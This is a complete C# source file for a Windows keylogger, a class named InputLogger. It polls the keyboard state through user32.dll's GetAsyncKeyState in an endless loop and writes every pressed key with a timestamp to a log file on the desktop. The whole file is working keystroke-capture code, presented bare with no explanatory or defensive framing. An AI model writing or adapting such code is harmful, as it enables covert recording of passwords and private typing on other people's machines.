using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

class InputLogger {
    private static StreamWriter writer;

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(Keys vKey);

    static void Main() {
        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "input_log.txt");
        writer = new StreamWriter(logPath, true);
        writer.AutoFlush = true;

        while (true) {
            foreach (Keys key in Enum.GetValues(typeof(Keys))) {
                if ((GetAsyncKeyState(key) & 0x8000) != 0) {
                    writer.Write($"{DateTime.Now:HH:mm:ss} - {key}\n");
                }
            }
            System.Threading.Thread.Sleep(100);
        }
    }
}
